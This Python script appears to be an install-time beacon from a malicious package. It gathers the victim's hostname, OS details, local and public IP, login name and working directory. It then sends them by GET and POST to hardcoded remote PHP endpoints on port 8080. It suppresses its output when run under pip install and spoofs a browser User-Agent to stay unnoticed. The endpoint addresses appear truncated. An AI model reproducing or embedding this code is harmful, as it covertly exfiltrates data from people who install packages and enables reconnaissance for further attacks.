import os
import json
import random
import socket
import platform
import requests

# Check if script is running inside pip install (rough heuristic)
is_preinstall = any("pip" in arg for arg in os.sys.argv)


# Collect system info
def get_local_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Unknown"


def get_public_ip():
    try:
        res = requests.get("https://api64.ipify.org?format=json", timeout=5)
        return res.json().get("ip", "Unknown")
    except Exception as e:
        if not is_preinstall:
            print(f"[!] Public IP error: {e}")
        return "Unknown"


def collect_system_info():
    return {
        "publicIP": "",  # Fetched later
        "hostname": socket.gethostname(),
        "osType": os.name,
        "osPlatform": platform.system(),
        "osRelease": platform.release(),
        "osArch": platform.machine(),
        "localIP": get_local_ip(),
        "whoamiUser": os.getlogin()
        if hasattr(os, "getlogin")
        else os.environ.get("USER", "unknown"),
        "currentDirectory": os.getcwd(),
    }


endpoints = ["http://34:8080/jpd3.php", "http://33:8080/jpd4.php"]


def get_random_endpoint():
    return random.choice(endpoints)


# Send data using both GET and POST
def send_data(data):
    endpoint = get_random_endpoint()

    try:
        # GET request with query params
        query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in data.items())
        get_url = f"{endpoint}?{query}"
        get_response = requests.get(get_url, timeout=5)

        # POST request with JSON body
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        }
        post_response = requests.post(endpoint, headers=headers, json=data, timeout=5)

        if not is_preinstall:
            print("[*] GET Response:", get_response.text)
            print("[*] POST Response:", post_response.text)
    except Exception as e:
        if not is_preinstall:
            print(f"[!] Error sending data: {e}")


def main():
    info = collect_system_info()
    info["publicIP"] = get_public_ip()
    send_data(info)


if __name__ == "__main__":
    main()
